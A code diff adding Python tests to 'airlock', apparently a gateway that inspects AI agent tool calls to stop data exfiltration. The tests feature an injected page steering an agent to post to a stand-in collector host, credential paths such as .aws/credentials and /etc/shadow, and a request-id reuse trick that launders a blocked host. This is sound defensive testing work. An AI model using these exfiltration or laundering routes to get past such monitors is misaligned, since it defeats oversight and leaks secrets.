@@ -13,7 +13,12 @@ from airlock.gateway.jsonrpc import Message
 from airlock.gateway.session import SessionContext
 from airlock.inspect.base import Verdict
 from airlock.provenance.inspector import ProvenanceInspector, is_sensitive_request
-from airlock.provenance.model import TaintStore, atoms_of, is_internal_host
+from airlock.provenance.model import (
+    SENSITIVE_PATH,
+    TaintStore,
+    atoms_of,
+    is_internal_host,
+)
 
 
 def _msg(payload: dict[str, object]) -> Message:
@@ -619,6 +624,153 @@ class TestFindingsDoNotLeakTheSecret:
         assert {f.rule for f in findings} & {"egress-tainted-value", "egress-sharded"}
         assert any(f.severity == "critical" for f in findings)
         assert any("read_file()" in f.detail for f in findings)
+
+
+class TestRealisticServerEchoes:
+    """Rules derived from transcripts, tested against what servers really do.
+
+    Both cases below were found by the integration suite rather than by reading
+    a transcript, which is the argument for having one: the corpus is
+    transcript-based by choice, and a transcript does not contain the reply a
+    server actually sends.
+    """
+
+    def test_a_server_echoing_the_requested_url_does_not_taint_that_url(self) -> None:
+        """Calling the same API twice must not become a block.
+
+        Servers routinely report what they did -- "200 OK https://host/path" --
+        and the naive reading treats the context as the place the host came
+        from. It did not: the agent typed the host into the request. Left
+        alone, this makes the *second* ordinary call to any API a block, which
+        is the most common request pattern there is.
+        """
+        url = "https://api.example.net/v1/status"
+        echo = f'200 OK {url} <- {{"body": "pong", "url": "{url}"}}'
+        steps: list[tuple[str, dict]] = [
+            ("req", call(1, "post_url", {"url": url, "body": "pong"})),
+            ("res", result(1, echo)),
+            (
+                "req",
+                call(2, "post_url", {"url": "https://api.example.net/v1/status", "body": "ping"}),
+            ),
+        ]
+        verdicts = drive(ProvenanceInspector(), steps)
+        assert verdicts[2].action == "allow", (
+            "an echo of the agent's own URL was treated as a source"
+        )
+
+    def test_a_host_learned_from_content_is_still_caught(self) -> None:
+        """The mirror of the rule above, and the reason it is not a blank cheque.
+
+        Withdrawing only the host the agent supplied leaves every other host in
+        the same result tainted. A page that echoes the URL you fetched and also
+        links somewhere else is a plausible exfiltration channel, and dropping
+        the second host with the first would close the rule this layer exists
+        to enforce.
+        """
+        steps: list[tuple[str, dict]] = [
+            ("req", call(1, "web_fetch", {"url": "https://news.example.com/story"})),
+            (
+                "res",
+                result(
+                    1,
+                    "Fetched https://news.example.com/story\n"
+                    "For more, see https://collector.example.net/collect",
+                ),
+            ),
+            (
+                "req",
+                call(2, "post_url", {"url": "https://collector.example.net/collect", "body": "x"}),
+            ),
+        ]
+        verdicts = drive(ProvenanceInspector(), steps)
+        assert verdicts[2].action == "block", "a host learned from content was not caught"
+
+
+class TestStructuredSources:
+    def test_a_credential_column_is_a_sensitive_read(self) -> None:
+        """A database read has no path in it, only a table name.
+
+        The path regex cannot see `SELECT token FROM credentials`, so without an
+        identifier rule a credential lifted out of a database is exfiltrated
+        invisibly. Found by the SQLite integration fixture.
+        """
+        assert is_sensitive_request("select", {"sql": "SELECT token FROM credentials"})
+
+    def test_an_ordinary_query_is_not_a_sensitive_read(self) -> None:
+        """The false-positive side of the same rule.
+
+        `SELECT id FROM sessions` names no secret store and must read as
+        ordinary traffic. The rule keys on the identifiers a query names, so a
+        table called `credentials` is judged sensitive whatever column is
+        pulled from it -- a deliberate choice, because a false positive here
+        only records a source, while a false negative is a silent leak.
+        """
+        assert not is_sensitive_request("select", {"sql": "SELECT id FROM sessions"})
+        assert not is_sensitive_request("select", {"sql": "SELECT name FROM users"})
+        assert not is_sensitive_request("list_directory", {"path": "."})
+        assert not is_sensitive_request("read_file", {"path": "README.md"})
+
+    def test_a_path_rule_does_not_fire_on_a_bare_sql_identifier(self) -> None:
+        """`SENSITIVE_PATH` answers questions about paths, not about words.
+
+        The `credentials` alternative has to require a real path boundary, or it
+        matches the tail of `SELECT ... FROM credentials` on the strength of a
+        space. That match is masked today by the identifier rule checked after
+        it, and masking is not a reason to leave it: the two rules answer
+        different questions, and only one of them is ever asked about a path.
+
+        A query embedding an actual path is a different matter -- `FROM
+        /etc/shadow` really does name a secret store, and the path rule
+        catching it is right rather than lucky.
+        """
+        assert SENSITIVE_PATH.search("SELECT id FROM credentials") is None
+        assert SENSITIVE_PATH.search("select * from sessions") is None
+        # And it still matches every shape it exists for.
+        assert SENSITIVE_PATH.search("credentials")
+        assert SENSITIVE_PATH.search("/home/dev/.aws/credentials")
+        assert SENSITIVE_PATH.search("config/credentials.json")
+
+
+class TestRequestCorrelation:
+    """A blocked request is answered by the gateway, so it has no response.
+
+    That is the easy half. The half worth testing is what is left behind, and
+    whether a later request can be made to launder a host through it.
+    """
+
+    def test_a_reused_id_cannot_launder_a_learned_host(self) -> None:
+        """A blocked request must not leave state that a later call can use.
+
+        `memory_write` is the way in. It returns before the inspector records
+        the request, so an id it reuses keeps whatever the blocked request left
+        behind -- and the response to the memory write is then read as the
+        result of the blocked `post_url`, complete with that call's destination.
+        Recording it withdraws the destination from the sources that named it,
+        and the host is laundered: a host the gateway learned from untrusted
+        content becomes a host the agent chose for itself, and the next post
+        to it sails through.
+        """
+        learned = "https://collector.example.net/collect"
+        steps: list[tuple[str, dict]] = [
+            # Learn that a host is hostile, from a page that links to it.
+            ("req", call(1, "web_fetch", {"url": "https://news.example.com/story"})),
+            ("res", result(1, f"Story text. Mirrored at {learned}")),
+            # Post to it: blocked for being a destination the agent did not pick.
+            ("req", call(5, "post_url", {"url": learned, "body": "hello"})),
+            # Reuse the id for a tool the inspector short-circuits, so the
+            # blocked request's entry is still sitting there.
+            ("req", call(5, "memory_write", {"key": "note", "value": "unrelated"})),
+            ("res", result(5, "stored")),
+            # The learned host must still be treated as learned.
+            ("req", call(6, "post_url", {"url": learned, "body": "hello"})),
+        ]
+        verdicts = drive(ProvenanceInspector(), steps)
+        assert verdicts[2].action == "block", "the first post should have been blocked"
+        assert verdicts[5].action == "block", (
+            "a host learned from untrusted content was laundered by a reused "
+            "request id, so posting to it was allowed"
+        )
 
 
 class TestSessionState:
